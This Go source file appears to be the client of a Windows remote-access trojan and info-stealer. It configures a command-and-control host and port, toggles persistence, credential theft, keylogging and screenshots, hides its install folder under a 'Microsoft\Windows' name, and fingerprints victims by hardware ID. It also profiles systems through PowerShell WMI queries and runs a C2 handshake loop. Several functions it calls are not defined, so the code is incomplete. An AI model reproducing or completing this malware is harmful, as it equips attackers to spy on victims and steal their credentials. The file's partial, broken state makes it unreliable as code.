package main

import (
	"crypto/md5"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"math/big"
	"os"
	"os/exec"
	"os/user"
	"runtime/debug"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"github.com/buger/jsonparser"
	"github.com/rodolfoag/gow32"
)

var buildVersion = "fc9436c717"

var (
	c2Host             = "127.0.0.1"
	c2Port             = "4444"
	mutexPrefix        = "letgob"
	enablePersistence  = "true"
	enableStealer      = "true"
	enableKeylogger    = "true"
	enableScreenshots  = "true"
	enableAntiAnalysis = "false"
	installFolderName  = "Microsoft\\Windows"
)

var (
	bestMethod int32 = 0
	sysInfo    systemInfo
)

type Credential struct {
	URL      string
	Username string
	Password string
}

type systemInfo struct {
	Username  string
	CPUName   string
	GPUNames  string
	OSCaption string
	RAM       uint64
}

var globalKeyBytes []byte

func a() ([]byte, error) {
	s := string(globalKeyBytes)
	s = s + "e"
	b, err := hex.DecodeString(s)
	if err != nil {
		return nil, err
	}
	return b, nil
}

func gb(data []byte) *big.Int {
	return new(big.Int).SetBytes(data)
}

func rsaPow(base *big.Int, e int64, mod *big.Int) []byte {
	exp := big.NewInt(e)
	result := new(big.Int).Exp(base, exp, mod)
	return result.Bytes()
}

func md5str(s string) string {
	h := md5.Sum([]byte(s))
	return fmt.Sprintf("%x", h)
}

var user32dll = syscall.NewLazyDLL("user32.dll")

func GetHWID() string {
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	getVolumeInfo := kernel32.NewProc("GetVolumeInformationW")
	rootPath, _ := syscall.UTF16PtrFromString("C:\\")

	var serial uint32
	getVolumeInfo.Call(
		uintptr(unsafe.Pointer(rootPath)),
		0, 0,
		uintptr(unsafe.Pointer(&serial)),
		0, 0, 0, 0,
	)

	var buf [256]uint16
	size := uint32(len(buf))
	kernel32.NewProc("GetComputerNameW").Call(
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(unsafe.Pointer(&size)),
	)
	name := syscall.UTF16ToString(buf[:size])
	raw := fmt.Sprintf("%d%s", serial, name)
	h := md5.Sum([]byte(raw))
	return fmt.Sprintf("%x", h)
}

func collectSysInfo() {
	if u, err := user.Current(); err == nil {
		sysInfo.Username = u.Username
	}
	sysInfo.CPUName = wmiQuery("select Name from Win32_Processor", "Name")
	sysInfo.GPUNames = wmiQuery("Select Name from Win32_VideoController", "Name")
	sysInfo.OSCaption = wmiQuery("select * from Win32_OperatingSystem", "Caption")
	sysInfo.RAM = wmiQueryUint64("select TotalPhysicalMemory from Win32_ComputerSystem", "TotalPhysicalMemory")
}

func wmiQuery(query, field string) string {
	cmd := exec.Command("powershell", "-Command",
		fmt.Sprintf("(Get-WmiObject -Query \"%s\").%s", query, field))
	out, err := cmd.Output()
	if err != nil {
		return ""
	}
	return strings.TrimSpace(string(out))
}

func wmiQueryUint64(query, field string) uint64 {
	s := wmiQuery(query, field)

	var v uint64
	fmt.Sscanf(s, "%d", &v)
	return v
}

func buildInitPayload() []byte {
	hwid := GetHWID()
	msg := map[string]interface{}{
		"window":       hwid,
		"buildVersion": buildVersion,
		"activeWin":    "",
	}
	payload, _ := json.Marshal(msg)
	return payload
}

func handshake(payload []byte) ([]byte, error) {
	for {
		encoded := dec(payload)
		resp, err := rq(encoded)
		if err != nil {
			log_(fmt.Sprintf("rq error: %v\n%s", err, string(debug.Stack())))
			time.Sleep(1 * time.Second)
			changeEndpoint(0, 1)
			continue
		}
		waitVal, dataType, _, err := jsonparser.Get(resp, "wait")
		if err != nil || dataType == jsonparser.NotExist {
			time.Sleep(1 * time.Second)
			changeEndpoint(0, 1)
			continue
		}
		wait, _ := jsonparser.ParseInt(waitVal)
		if wait == 0 || wait == 1 {
			return resp, nil
		}
		time.Sleep(1 * time.Second)
		changeEndpoint(0, 1)
	}
}



func checkDupe() {
	hwid := GetHWID()
	mutexName := mutexPrefix + hwid
	_, err := gow32.CreateMutex(mutexName)
	if err != nil {
		os.Exit(1)
	}
}



func isAdmin() bool {
	_, err := os.Open(`\\.\PHYSICALDRIVE0`)
	return err == nil
}

func main() {
	checkDupe()
	if isRunningAsSystem() {
		relaunchAsUser()
		return
	}
	if strings.EqualFold(enablePersistence, "true") || enablePersistence == "1" {
		staticinstall()
	}
	collectSysInfo()
	go runSession()
	select {}
}

func findProcessByName(name string) bool {
	out, err := exec.Command("tasklist", "/FI", "IMAGENAME eq "+name, "/NH").Output()
	if err != nil {
		return false
	}
	return strings.Contains(strings.ToLower(string(out)), strings.ToLower(name))
}

func setupRSAKeys() {
	_ = rsaPow
}

func isRunningAsSystem() bool {
	u, err := user.Current()
	if err != nil {
		return false
	}
	return strings.EqualFold(u.Username, "SYSTEM") ||
		strings.EqualFold(u.Username, "NT AUTHORITY\\SYSTEM")
}

func relaunchAsUser() {
	exe, _ := os.Executable()
	sessionID := 1
	if len(os.Args) > 2 {
		fmt.Sscanf(os.Args[2], "%d", &sessionID)
	}
	_ = exe
	_ = sessionID
	os.Exit(0)
}



func osExecCommand(name string, args ...string) *exec.Cmd {
	return exec.Command(name, args...)
}

func equalCI(s, t string) bool {
	return strings.EqualFold(s, t)
}
